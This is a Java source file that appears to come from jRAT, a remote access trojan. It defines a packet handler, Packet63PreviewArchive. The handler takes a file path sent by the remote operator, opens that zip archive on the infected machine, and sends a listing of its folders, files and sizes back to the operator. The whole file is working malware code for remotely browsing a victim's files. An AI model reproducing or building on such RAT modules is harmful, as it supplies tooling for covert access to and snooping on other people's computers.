package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.AbstractIncomingPacket;

import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;


public class Packet63PreviewArchive extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		ZipFile zip = new ZipFile(file);
		Enumeration<? extends ZipEntry> entries = zip.entries();
		List<ZipEntry> folders = new ArrayList<>();
		List<ZipEntry> files = new ArrayList<>();
		while (entries.hasMoreElements()) {
			ZipEntry entry = entries.nextElement();
			if (entry.isDirectory()) {
				folders.add(entry);
			} else {
				files.add(entry);
			}
		}

		for (ZipEntry entry : folders) {
			con.addToSendQueue(new Packet45ArchivePreview(file,true, entry.getName(), 0L));
		}

		for (ZipEntry entry : files) {
			con.addToSendQueue(new Packet45ArchivePreview(file, false, entry.getName(), entry.getSize() / 1024L));
		}

		zip.close();
	}

}
